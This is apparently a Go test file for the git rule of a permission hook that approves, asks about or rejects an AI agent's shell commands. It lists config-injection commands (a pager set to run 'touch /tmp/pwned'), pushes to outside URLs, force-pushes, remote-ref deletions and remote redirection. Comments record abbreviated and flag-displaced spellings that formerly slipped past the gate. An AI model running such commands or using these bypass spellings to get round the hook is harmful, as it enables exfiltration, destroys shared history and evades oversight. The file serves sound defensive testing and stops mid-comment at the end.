package git

import (
	"encoding/json"
	"testing"

	"github.com/phillipgreenii/claude-extended-tool-approver/internal/hookio"
)

func mustJSON(v any) json.RawMessage {
	b, _ := json.Marshal(v)
	return b
}

func TestGit_ConfigInjection_Abstain(t *testing.T) {
	r := New(nil)
	// A pre-subcommand -c / --config-env injects config that runs on a read-only
	// subcommand (RCE class) — must Abstain (pg2-t4uyx).
	abstain := []string{
		`git -c core.pager="touch /tmp/pwned" log`,
		"git -c core.pager=EVIL log",
		"git --config-env=core.pager=X log",
		"git --config-env core.pager=X log",
		"git -C /repo -c core.pager=EVIL log", // still fires after a -C option
	}
	for _, cmd := range abstain {
		input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
		got := r.Evaluate(input)
		if got.Decision != hookio.Abstain {
			t.Errorf("cmd %q: got %s, want abstain (config injection)", cmd, got.Decision)
		}
	}

	// The guard MUST NOT fire on a -c that is NOT a pre-subcommand config flag,
	// nor on -C (a different, legitimate option). These keep their normal verdict.
	notInjection := []string{
		"git commit -c HEAD~1", // -c after the subcommand reuses a commit message
		"git -C /some/path status",
		"git status",
	}
	for _, cmd := range notInjection {
		input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s (%s), want approve (must not be flagged as injection)", cmd, got.Decision, got.Reason)
		}
	}
}

func TestGit_ReadOnly_Approve(t *testing.T) {
	readOnly := []string{
		// Porcelain inspection
		"git log", "git diff", "git status", "git show", "git blame", "git describe",
		"git shortlog", "git reflog", "git grep foo",
		"git show-branch", "git whatchanged", "git range-diff main..feat main..other",
		// Plumbing: ref/object inspection
		"git for-each-ref", "git ls-files", "git ls-remote", "git ls-tree",
		"git merge-base", "git rev-list", "git rev-parse", "git show-ref",
		"git name-rev HEAD", "git cat-file -p HEAD", "git count-objects",
		// Plumbing: diff variants
		"git diff-tree --no-commit-id -r HEAD", "git diff-index HEAD", "git diff-files",
		// Plumbing: verification/integrity
		"git verify-commit HEAD", "git verify-tag v1.0", "git fsck",
		// Plumbing: gitignore/gitattributes checks
		"git check-ignore foo.log", "git check-attr diff -- file.txt",
		"git check-mailmap user@example.com", "git check-ref-format refs/heads/main",
	}
	r := New(nil)
	for _, cmd := range readOnly {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s, want approve", cmd, got.Decision)
		}
	}
}

func TestGit_Modifying_Approve(t *testing.T) {
	modifying := []string{
		"git add .", "git commit -m msg", "git branch feat", "git fetch",
		"git push", "git stash", "git config x y", "git mu",
	}
	r := New(nil)
	for _, cmd := range modifying {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s, want approve", cmd, got.Decision)
		}
	}
}

func TestGit_ResetSoft_Approve(t *testing.T) {
	approve := []string{
		"git reset HEAD~1",
		"git reset --soft HEAD~1",
	}
	r := New(nil)
	for _, cmd := range approve {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s, want approve", cmd, got.Decision)
		}
	}
}

func TestGit_ResetHard_Ask(t *testing.T) {
	// Ensure reset --hard still asks
	r := New(nil)
	input := &hookio.HookInput{
		ToolName:  "Bash",
		ToolInput: mustJSON(map[string]string{"command": "git reset --hard HEAD~1"}),
	}
	got := r.Evaluate(input)
	if got.Decision != hookio.Ask {
		t.Errorf("git reset --hard: got %s, want ask", got.Decision)
	}
}

// TestGit_Destructive_Ask pins what remains on the shared destructive Ask after
// pg2-bohpm split it. `git push --force` and `git push -f` USED to be pinned here
// as Ask; they are now Reject (TestGit_PushForce_Reject) per the operator ruling
// of 2026-07-30, so their absence from this list is the intended change, not a
// weakened test. `git branch -D` deliberately stays — see
// TestGit_BranchForceDelete_StaysAsk for why that is load-bearing.
func TestGit_Destructive_Ask(t *testing.T) {
	destructive := []string{
		"git reset --hard HEAD",
		"git clean -fd",
		"git branch -D feat",
	}
	r := New(nil)
	for _, cmd := range destructive {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Ask {
			t.Errorf("cmd %q: got %s, want ask", cmd, got.Decision)
		}
	}
}

func TestGit_NonGit_Abstain(t *testing.T) {
	r := New(nil)
	input := &hookio.HookInput{
		ToolName:  "Bash",
		ToolInput: mustJSON(map[string]string{"command": "ls -la"}),
	}
	got := r.Evaluate(input)
	if got.Decision != hookio.Abstain {
		t.Errorf("ls: got %s, want abstain", got.Decision)
	}
}

func TestGit_NonBash_Abstain(t *testing.T) {
	r := New(nil)
	input := &hookio.HookInput{
		ToolName:  "Read",
		ToolInput: mustJSON(map[string]string{"file_path": "/tmp/x"}),
	}
	got := r.Evaluate(input)
	if got.Decision != hookio.Abstain {
		t.Errorf("Read: got %s, want abstain", got.Decision)
	}
}

func TestGit_Name(t *testing.T) {
	r := New(nil)
	if got := r.Name(); got != "git" {
		t.Errorf("Name() = %q, want git", got)
	}
}

func TestGit_GitDirReadOnly_Approve(t *testing.T) {
	r := New(nil)
	commands := []string{
		"GIT_DIR=/other git log",
		"GIT_DIR=/other git diff",
		"GIT_DIR=/other git status",
		"GIT_WORK_TREE=/other git show HEAD",
		"GIT_DIR=/other GIT_WORK_TREE=/other git blame file.go",
	}
	for _, cmd := range commands {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s, want approve (read-only with redirected context)", cmd, got.Decision)
		}
	}
}

func TestGit_GitDirModifying_Ask(t *testing.T) {
	r := New(nil)
	commands := []string{
		"GIT_DIR=/other git push",
		"GIT_DIR=/other git commit -m msg",
		"GIT_WORK_TREE=/other git add .",
		"GIT_DIR=/other git rebase main",
		"GIT_DIR=/other git reset HEAD~1",
	}
	for _, cmd := range commands {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Ask {
			t.Errorf("cmd %q: got %s, want ask (modifying with redirected context)", cmd, got.Decision)
		}
	}
}

func TestGit_CosmeticEnvVars_Unchanged(t *testing.T) {
	r := New(nil)
	commands := []string{
		"GIT_AUTHOR_NAME=foo git commit -m msg",
		"GIT_AUTHOR_EMAIL=foo@bar git commit -m msg",
		"GIT_COMMITTER_NAME=foo git commit -m msg",
		"GIT_AUTHOR_DATE=2024-01-01 git commit -m msg",
	}
	for _, cmd := range commands {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s, want approve (cosmetic env var shouldn't change decision)", cmd, got.Decision)
		}
	}
}

func TestGit_RebaseNonInteractive_Approve(t *testing.T) {
	r := New(nil)
	input := &hookio.HookInput{
		ToolName:  "Bash",
		ToolInput: mustJSON(map[string]string{"command": "git rebase main"}),
	}
	got := r.Evaluate(input)
	if got.Decision != hookio.Approve {
		t.Errorf("git rebase main: got %s, want approve", got.Decision)
	}
}

func TestGit_Checkout_Approve(t *testing.T) {
	approve := []string{
		"git checkout feature-branch",
		"git checkout -- src/main.go",
		"git checkout -b new-branch",
	}
	r := New(nil)
	for _, cmd := range approve {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s, want approve", cmd, got.Decision)
		}
	}
}

func TestGit_CheckoutDot_Approve(t *testing.T) {
	approve := []string{
		"git checkout .",
		"git checkout -- .",
	}
	r := New(nil)
	for _, cmd := range approve {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s, want approve", cmd, got.Decision)
		}
	}
}

func TestGit_MvRm_Approve(t *testing.T) {
	approve := []string{
		"git mv old.go new.go",
		"git rm stale.go",
		"git rm --cached file.go",
	}
	r := New(nil)
	for _, cmd := range approve {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s, want approve", cmd, got.Decision)
		}
	}
}

func TestGit_Worktree_Approve(t *testing.T) {
	approve := []string{
		"git worktree add ../feature feature-branch",
		"git worktree remove ../feature",
		"git worktree list",
		"git worktree prune",
		"git worktree move ../old ../new",
		"git worktree repair",
	}
	r := New(nil)
	for _, cmd := range approve {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s, want approve", cmd, got.Decision)
		}
	}
}

func TestGit_CherryPick_Approve(t *testing.T) {
	r := New(nil)
	input := &hookio.HookInput{
		ToolName:  "Bash",
		ToolInput: mustJSON(map[string]string{"command": "git cherry-pick abc123"}),
	}
	got := r.Evaluate(input)
	if got.Decision != hookio.Approve {
		t.Errorf("git cherry-pick: got %s, want approve", got.Decision)
	}
}

func TestGit_RebaseInteractive_Abstain(t *testing.T) {
	r := New(nil)
	input := &hookio.HookInput{
		ToolName:  "Bash",
		ToolInput: mustJSON(map[string]string{"command": "git rebase -i HEAD~3"}),
	}
	got := r.Evaluate(input)
	if got.Decision != hookio.Abstain {
		t.Errorf("git rebase -i: got %s, want abstain (interactive)", got.Decision)
	}
}

func TestGit_RebaseInteractiveWithSequenceEditor_Approve(t *testing.T) {
	r := New(nil)
	approve := []string{
		`GIT_SEQUENCE_EDITOR="sed -i.bak 's/^pick /reword /'" git rebase -i HEAD~3`,
		`GIT_SEQUENCE_EDITOR="sed -i 's/^pick /fixup /'" git rebase --interactive ae21327~1`,
	}
	for _, cmd := range approve {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s, want approve (automated interactive rebase)", cmd, got.Decision)
		}
	}
}

func TestGit_FilterBranch_Approve(t *testing.T) {
	r := New(nil)
	approve := []string{
		`FILTER_BRANCH_SQUELCH_WARNING=1 git filter-branch -f --msg-filter 'sed "/^Refs: NO-JIRA$/d"' HEAD~4..HEAD`,
		`git filter-branch --msg-filter 'sed "s/old/new/"' HEAD~2..HEAD`,
	}
	for _, cmd := range approve {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s, want approve", cmd, got.Decision)
		}
	}
}

func TestGit_FilterBranchWithGitDir_Ask(t *testing.T) {
	r := New(nil)
	input := &hookio.HookInput{
		ToolName:  "Bash",
		ToolInput: mustJSON(map[string]string{"command": `GIT_DIR=/other git filter-branch --msg-filter 'cat' HEAD~1..HEAD`}),
	}
	got := r.Evaluate(input)
	if got.Decision != hookio.Ask {
		t.Errorf("git filter-branch with GIT_DIR: got %s, want ask", got.Decision)
	}
}

func TestGit_Tag_Reject(t *testing.T) {
	reject := []string{
		"git tag v1.0",
		"git tag -d v1.0",
		"git tag -a v1.0 -m \"msg\"",
	}
	r := New(nil)
	for _, cmd := range reject {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Reject {
			t.Errorf("cmd %q: got %s, want reject", cmd, got.Decision)
		}
	}
}

// TestGit_RemoteMutating_Reject pins the pg2-8imjo verdict. Operator ruling
// 2026-07-30: a `git remote` MUTATION is a hard Reject — it silently redirects
// where pushes land, which is an exfiltration vector, and the operator would
// rather run those by hand. The bare forms were Ask before; the FLAG-DISPLACED
// forms measured `allow` on a binary built from main @ b497d6f6 (2026-07-30)
// because the arm read its subcommand as `rest[0]` with no flag skipping.
//
// The `-v` / `--verbose` rows are the defect this bead exists to close and MUST
// NOT be dropped: deleting them would let a future edit reintroduce an index-based
// lookup with every remaining row still green.
func TestGit_RemoteMutating_Reject(t *testing.T) {
	reject := []string{
		// FLAG-DISPLACED — THE measured holes. rest[0] was the flag, not the verb.
		"git remote -v add upstream https://example.invalid/x.git",
		"git remote --verbose add upstream https://example.invalid/x.git",
		"git remote -v set-url origin https://example.invalid/x.git",
		"git remote --verbose set-url origin https://example.invalid/x.git",
		"git remote -v rename origin upstream",
		"git remote -v remove origin",
		"git remote -v rm origin",
		"git remote -v set-head origin main",
		"git remote -v set-branches origin main",
		// Bare forms — Ask before the ruling, Reject now.
		"git remote add upstream https://example.invalid/x.git",
		"git remote remove origin",
		"git remote rm origin",
		"git remote rename origin upstream",
		"git remote set-url origin https://example.invalid/x.git",
		"git remote set-head origin main",
		"git remote set-branches origin main",
		// Mutation flags AFTER the verb do not move the verb, but pin them anyway.
		"git remote add -f upstream https://example.invalid/x.git",
		"git remote set-url --add origin https://example.invalid/x.git",
		"git remote set-url --push origin https://example.invalid/x.git",
		// A `--` end-of-options terminator: FirstOperand takes the NEXT token.
		"git remote -- add upstream https://example.invalid/x.git",
		// A pre-subcommand `-C` does not displace the remote verb either.
		"git -C /tmp/repo remote -v add upstream https://example.invalid/x.git",
	}
	r := New(nil)
	for _, cmd := range reject {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision == hookio.Approve {
			t.Fatalf("cmd %q: got APPROVE (%s) — the remote verb was displaced out of the blocked set; the pg2-8imjo defect", cmd, got.Reason)
		}
		if got.Decision != hookio.Reject {
			t.Errorf("cmd %q: got %s (%s), want reject (git remote mutation)", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_RemoteReadOnly_Approve is the pg2-8imjo REGRESSION GUARD. Inspecting
// remotes is how an agent reads its own repo state and MUST stay approvable; a fix
// that Rejected the whole `git remote` subcommand would pass the Reject test above
// and break every one of these.
//
// `prune` and `update` are here deliberately: they refresh LOCAL remote-tracking
// refs from the remote a name already points at, so neither can redirect a push,
// and gating them is a verdict change this bead has no ruling for.
func TestGit_RemoteReadOnly_Approve(t *testing.T) {
	approve := []string{
		"git remote",
		"git remote -v",
		"git remote --verbose",
		"git remote show origin",
		"git remote show",
		"git remote get-url origin",
		"git remote get-url --all origin",
		"git remote -v show origin",
		"git remote prune origin",
		"git remote update",
	}
	r := New(nil)
	for _, cmd := range approve {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s (%s), want approve (read-only git remote must stay approvable)", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_RemoteMutation_TextIsNotAnOperation is the pg2-8imjo half of the
// pg2-5b901 text-vs-parsed guard. pg2-5b901 is the live precedent: primarycommit
// hard-denied a `bd update` whose ARGUMENT TEXT documented a commit. A `git remote
// set-url` spelling quoted in a bd body or a commit message is TEXT, and denying it
// would make this bead's own bookkeeping undeniable-by-hook.
func TestGit_RemoteMutation_TextIsNotAnOperation(t *testing.T) {
	r := New(nil)
	cases := []struct {
		cmd  string
		want hookio.Decision
	}{
		{`bd comment pg2-8imjo -m "git remote set-url origin https://example.invalid/x.git measured allow"`, hookio.Abstain},
		{`bd update pg2-8imjo --notes "do not run git remote -v add upstream https://example.invalid/x.git"`, hookio.Abstain},
		{`git commit -m "git remote set-url is prohibited (pg2-8imjo)"`, hookio.Approve},
		{`git commit -m "the git remote add gate was flag-displaceable"`, hookio.Approve},
	}
	for _, tc := range cases {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": tc.cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision == hookio.Reject {
			t.Errorf("cmd %q: got REJECT (%s) — a remote mutation appearing as TEXT must not be denied", tc.cmd, got.Reason)
		}
		if got.Decision != tc.want {
			t.Errorf("cmd %q: got %s (%s), want %s", tc.cmd, got.Decision, got.Reason, tc.want)
		}
	}
}

// TestGit_PushForceWithLease_Approve is the pg2-bohpm REGRESSION GUARD: a
// SAME-BRANCH --force-with-lease is the correct post-rebase idiom and is in daily
// use, so it stays Approve in every spelling. Denying any of these is WRONG.
//
// The `=main:abc123` row is the semantic trap: in
// `--force-with-lease=<refname>:<expect>` the colon separates the ref from the
// EXPECTED OBJECT ID, not local from remote, so that row is a same-branch push
// carrying an explicit lease — the safest form there is.
func TestGit_PushForceWithLease_Approve(t *testing.T) {
	approve := []string{
		"git push --force-with-lease",
		"git push origin main --force-with-lease",
		"git push --force-with-lease origin main",
		"git push --force-with-lease origin main:main",
		"git push --force-with-lease=main:abc123 origin main",
		"git push --force-with-lease=main origin main",
	}
	r := New(nil)
	for _, cmd := range approve {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s (%s), want approve (same-branch lease must stay approvable)", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_PushForceWithLease_CrossBranch_Reject pins the pg2-bohpm hole. The
// bare form was already Ask; the `=`-glued form measured `allow` on 2026-07-30
// and was THE hole. Both are now Reject: the lease pins only the ref it NAMES,
// so it gives zero protection against naming the wrong branch (reproduced
// 2026-07-30 — pushing main onto a divergent `other` with a fresh lease exited 0
// and destroyed the unique commit on `other`).
func TestGit_PushForceWithLease_CrossBranch_Reject(t *testing.T) {
	reject := []string{
		"git push origin local:different --force-with-lease",
		"git push --force-with-lease origin main:other",
		"git push --force-with-lease=other origin main:other", // THE measured hole
		"git push --force-with-lease=main:abc123 origin main:other",
		"git push --force-w origin main:other", // git accepts this abbreviation
		"git push --force-with-lease origin HEAD:main",
	}
	r := New(nil)
	for _, cmd := range reject {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Reject {
			t.Errorf("cmd %q: got %s (%s), want reject (cross-branch lease)", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_PushForceWithLease_NonOriginRemote_Ask pins that pg2-bohpm did not
// LOOSEN anything: a same-branch lease to a remote other than origin kept the Ask
// it had before the change.
func TestGit_PushForceWithLease_NonOriginRemote_Ask(t *testing.T) {
	r := New(nil)
	input := &hookio.HookInput{
		ToolName:  "Bash",
		ToolInput: mustJSON(map[string]string{"command": "git push --force-with-lease upstream main"}),
	}
	got := r.Evaluate(input)
	if got.Decision != hookio.Ask {
		t.Errorf("git push --force-with-lease upstream main: got %s (%s), want ask (unchanged)", got.Decision, got.Reason)
	}
}

// TestGit_PushForce_Reject replaces the former TestGit_PushForce_Ask. Operator
// ruling 2026-07-30: an agent must never force-push. `--force` and `-f` were Ask
// before; every OTHER spelling of the same operation measured `allow`, which is
// why Ask could not implement the ruling — see pushVerdict's doc comment.
func TestGit_PushForce_Reject(t *testing.T) {
	reject := []string{
		"git push --force",
		"git push -f",
		"git push --force origin main",
		"git push -f origin main",
		"git push -fu origin main", // clustered short, measured `allow` before
		"git push -uf origin main", // clustered short, other order
		"git push origin +main",    // force via refspec prefix, no flag at all
		"git push origin +main:main",
		"git push origin main:other +feat", // force on a LATER refspec
		"git push --force=x origin main",   // git rejects the =-glued form; refused anyway
		"git push -- origin +main",         // after end-of-options the refspec still forces
	}
	r := New(nil)
	for _, cmd := range reject {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Reject {
			t.Errorf("cmd %q: got %s (%s), want reject (force-push)", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_PushDelete_Reject pins the pg2-bohpm verdict for a REMOTE-REF DELETE.
// Both spellings measured `allow` on 2026-07-30. Verdict: Reject — the ref may be
// another clone's only copy and nothing an agent can do restores it; pinning only
// the `:main` refspec form would teach `--delete` as the bypass.
func TestGit_PushDelete_Reject(t *testing.T) {
	reject := []string{
		"git push origin :main",
		"git push --delete origin main",
		"git push -d origin main",
		"git push origin --delete main",
		"git push --del origin main", // git accepts this abbreviation
		"git push origin main :feat", // delete on a LATER refspec
	}
	r := New(nil)
	for _, cmd := range reject {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Reject {
			t.Errorf("cmd %q: got %s (%s), want reject (remote-ref delete)", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_PushMirror_Reject pins the pg2-bohpm verdict for `--mirror`, which
// measured `allow` on 2026-07-30. Verdict: Reject — it deletes every remote ref
// absent locally, an unbounded remote-ref deletion strictly broader than the
// single-branch delete above.
func TestGit_PushMirror_Reject(t *testing.T) {
	reject := []string{
		"git push --mirror origin",
		"git push --mirror",
		"git push --m origin", // git accepts this abbreviation (only `--mirror` starts with m)
	}
	r := New(nil)
	for _, cmd := range reject {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Reject {
			t.Errorf("cmd %q: got %s (%s), want reject (--mirror)", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_PushOrdinary_Approve is the pg2-bohpm REGRESSION GUARD for the pushes
// an agent legitimately makes. The `-o` rows are the flag-arity guard: `-o` is
// `git push`'s only value-taking short option and git accepts the value glued, so
// a value containing `f` or `d` must NOT be scanned as clustered flag letters.
func TestGit_PushOrdinary_Approve(t *testing.T) {
	approve := []string{
		"git push",
		"git push -u origin main",
		"git push origin main",
		"git push --tags",
		"git push origin HEAD",
		"git push origin main:other", // cross-branch WITHOUT force is out of scope
		"git push -o ci.skip origin main",
		"git push -oconfidential origin main", // glued -o value containing f and d
		// Abbreviation-scan false-positive guards: these long flags are NOT
		// --force / --delete / --mirror and must not be matched as one.
		"git push --force-if-includes origin main",
		"git push --recurse-submodules=on-demand origin main",
		"git push --dry-run origin main",
		"git push -n origin main",
		"git push --no-force-with-lease origin main:other",
	}
	r := New(nil)
	for _, cmd := range approve {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s (%s), want approve (ordinary push)", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_PushToNetworkURL_Reject pins the pg2-abb65 verdict. `git push` accepts a
// URL in place of a remote NAME, and every row here measured `allow` on
// 2026-07-30 — an agent could send any branch to any host with no prompt and
// without mutating `git remote` at all. Verdict: Reject, because an Ask would sit
// BELOW the `git remote set-url` control it mirrors and become the cheaper way
// around it (see pushVerdict's doc comment).
func TestGit_PushToNetworkURL_Reject(t *testing.T) {
	reject := []string{
		"git push https://example.invalid/x.git main", // THE measured hole
		"git push http://example.invalid/x.git main",
		"git push git://example.invalid/x.git main",
		"git push ssh://git@example.invalid/x.git main",
		"git push git@example.invalid:evil/x.git main", // scp-like
		"git push user@host:path/to/repo.git HEAD:main",
		"git push https://example.invalid/x.git", // no refspec
		"git push -u https://example.invalid/x.git main",
		"git push -- https://example.invalid/x.git main", // after end-of-options
		"git push git+ssh://git@example.invalid/x.git main",
		"git push HTTPS://example.invalid/x.git main", // scheme case-insensitive
		// --repo=<url> is documented as equivalent to the operand, so it is the same
		// push by another spelling; both value forms must be caught.
		"git push --repo=https://example.invalid/x.git",
		"git push --repo=https://example.invalid/x.git main",
		"git push --repo https://example.invalid/x.git",
		"git push --rep https://example.invalid/x.git", // shortest abbreviation git accepts
		// FirstOperand's separated-value shift moves the URL into refspec position;
		// the later-operand `://` scan is what closes it.
		"git push -o ci.skip https://example.invalid/x.git main",
	}
	r := New(nil)
	for _, cmd := range reject {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Reject {
			t.Errorf("cmd %q: got %s (%s), want reject (network push destination)", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_PushToLocalPath_Approve is the pg2-abb65 REGRESSION GUARD, and the one
// that a blanket "not a known remote name ⇒ Reject" would break. A local-path
// destination is legal git (measured 2026-07-30: bare, relative and `file://`
// pushes into a throwaway bare repo all succeeded) and is how this rule's own
// evidence was gathered, so it stays ungated. `file://` is local, NOT a URL.
func TestGit_PushToLocalPath_Approve(t *testing.T) {
	approve := []string{
		"git push /tmp/throwaway-repo.git main",
		"git push ./dst.git main",
		"git push ../dst.git main:rel",
		"git push ~/dst.git main",
		"git push sub/dir/dst.git main",
		"git push file:///tmp/throwaway-repo.git main:viafile",
		"git push /tmp/has:colon/dst.git main", // colon INSIDE a path, not scp-like
	}
	r := New(nil)
	for _, cmd := range approve {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s (%s), want approve (a LOCAL path destination is deliberately ungated)", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_PushNetworkURL_OrderedBeforeLeaseAsk pins the ORDER of the pg2-abb65
// gate against the non-origin `--force-with-lease` Ask, which is the one way this
// change can silently regress. A URL is never `origin`, so with the gate placed
// AFTER that block the Ask would swallow it and the URL form would DOWNGRADE from
// Reject to Ask — measured on the pre-fix binary, which answered `ask` for the
// first row here from exactly that branch.
func TestGit_PushNetworkURL_OrderedBeforeLeaseAsk(t *testing.T) {
	r := New(nil)
	for _, cmd := range []string{
		"git push --force-with-lease https://example.invalid/x.git main",
		"git push --force-with-lease=main:abc123 https://example.invalid/x.git main",
	} {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision == hookio.Ask {
			t.Fatalf("cmd %q: got ASK (%s) — the non-origin --force-with-lease branch shadowed the pg2-abb65 URL Reject", cmd, got.Reason)
		}
		if got.Decision != hookio.Reject {
			t.Errorf("cmd %q: got %s (%s), want reject (network push destination)", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_PushURL_TextIsNotADestination is the pg2-abb65 half of the pg2-5b901
// text-vs-parsed guard: a push URL QUOTED in a commit message or a `bd` body is
// TEXT, and gating it would repeat the failure mode where primarycommit hard-denied
// a `bd update` whose ARGUMENT documented a commit.
func TestGit_PushURL_TextIsNotADestination(t *testing.T) {
	r := New(nil)
	cases := []struct {
		cmd  string
		want hookio.Decision
	}{
		{`git commit -m "push to https://example.invalid/x.git is prohibited"`, hookio.Approve},
		{`git commit -m "git push git@example.invalid:evil/x.git main was allowed"`, hookio.Approve},
		{`bd comment pg2-abb65 -m "git push https://example.invalid/x.git main measured allow"`, hookio.Abstain},
		{`bd update pg2-abb65 --notes "do not push to ssh://git@example.invalid/x.git"`, hookio.Abstain},
	}
	for _, tc := range cases {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": tc.cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision == hookio.Reject {
			t.Errorf("cmd %q: got REJECT (%s) — a URL appearing as TEXT is not a push destination", tc.cmd, got.Reason)
		}
		if got.Decision != tc.want {
			t.Errorf("cmd %q: got %s (%s), want %s", tc.cmd, got.Decision, got.Reason, tc.want)
		}
	}
}

// TestGit_PushForce_TextIsNotAnOperation pins that the Reject keys on the PARSED
// operation and never on command TEXT. pg2-5b901 is the live precedent for the
// failure mode: primarycommit hard-denied a `bd update` whose ARGUMENT TEXT
// documented a commit. A prohibited push spelling quoted in a commit message or a
// bd body is text, and MUST NOT be denied.
func TestGit_PushForce_TextIsNotAnOperation(t *testing.T) {
	r := New(nil)
	cases := []struct {
		cmd  string
		want hookio.Decision
	}{
		// A git command whose ARGUMENT quotes the prohibition: still a commit.
		{`git commit -m "never --force push"`, hookio.Approve},
		{`git commit -m "do not git push origin +main"`, hookio.Approve},
		// Not a git executable at all: the rule never runs.
		{`bd comment pg2-bohpm -m "git push --force is prohibited"`, hookio.Abstain},
		{`bd update pg2-bohpm --notes "do not git push --force or push origin +main"`, hookio.Abstain},
	}
	for _, tc := range cases {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": tc.cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision == hookio.Reject {
			t.Errorf("cmd %q: got REJECT (%s) — a prohibited spelling appearing as TEXT must not be denied", tc.cmd, got.Reason)
		}
		if got.Decision != tc.want {
			t.Errorf("cmd %q: got %s (%s), want %s", tc.cmd, got.Decision, got.Reason, tc.want)
		}
	}
}

// TestGit_BranchForceDelete_StaysAsk pins the OTHER half of the split Ask site.
